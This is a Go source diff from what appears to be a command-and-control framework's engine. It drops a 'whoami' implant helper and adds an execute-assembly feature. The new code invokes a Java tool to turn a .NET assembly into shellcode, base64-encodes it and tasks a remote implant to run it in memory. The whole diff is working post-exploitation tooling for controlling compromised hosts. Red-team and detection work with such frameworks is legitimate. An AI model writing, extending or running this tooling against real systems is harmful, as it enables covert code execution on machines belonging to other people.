@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
@@ -414,17 +415,6 @@ func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
 	return nil
 }
 
-func (e *Engine) ImplantWhoami(id uint32) error {
-	// execute whoami command
-	e.ImplantTaskExecute(id, map[string]any{
-		"name":     "whoami",
-		"args":     nil,
-		"artifact": nil,
-	})
-
-	return nil
-}
-
 // ImplantPs
 func (e *Engine) ImplantPs(id uint32) error {
 	e.ImplantTaskExecute(id, map[string]any{
@@ -497,6 +487,43 @@ func (e *Engine) ImplantRun(id uint32, commandline string) error {
 		"name":     "run",
 		"args":     []string{commandline},
 		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string) error {
+	args := []string{
+		"-Dcrystalpalace.verbose=false",
+		"-jar",
+		e.Config.CrystalPalace.Lib,
+		"buildPic",
+		filepath.Join(e.Config.CrystalPalace.Pavilion, "execute-assembly-pico/runner.spec"),
+		"x64",
+		"/tmp/runner.bin",
+		`%ASSEMBLY_PATH=` + dotnet,
+		`%CMDLINE=` + cmdargs,
+	}
+
+	cmd := exec.Command("java", args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Run(); err != nil {
+		logger.Error("configuration failed: %v", err)
+		return nil
+	}
+
+	// read shellcode
+	pic, err := os.ReadFile("/tmp/runner.bin")
+	if err != nil {
+		logger.Error("failed to read implant exe: %v", err)
+		return nil
+	}
+
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "execute-assembly",
+		"args":     nil,
+		"artifact": base64.StdEncoding.EncodeToString(pic),
 	})
 
 	return nil
